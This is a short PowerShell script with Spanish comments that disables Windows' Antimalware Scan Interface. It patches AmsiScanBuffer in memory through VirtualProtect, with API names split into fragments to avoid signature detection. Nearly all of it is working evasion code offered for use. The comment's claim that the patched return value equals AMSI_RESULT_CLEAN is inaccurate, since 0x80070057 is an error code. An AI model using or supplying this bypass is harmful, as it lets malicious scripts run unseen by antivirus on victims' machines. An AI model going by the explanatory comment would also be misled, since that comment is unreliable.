# amsi.dll se mapea en la memoria virtual de cada proceso creado AmsiScanBuffer() se usa para detectar la
# credibilidad del contenido y como tenemos esa funcion mapeada en el espacio de memoria del proceso, podremos
# forzar a AmsiScanBuffer() para que siempre devuelva AMSI_RESULT_CLEAN
#
# AMSI_RESULT_CLEAN --> MOV EAX, 0x80070057 (Hex 0x57, 0x00, 0x07, 0x80)
#
#
# Si pasamos este valor en HEX a AmsiScanBuffer antes de la ejecucion, el valor de retorno SIEMPRE
# sera AMSI_RESULT_CLEAN


$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)


#######################################################################################################



#######################################################################################################
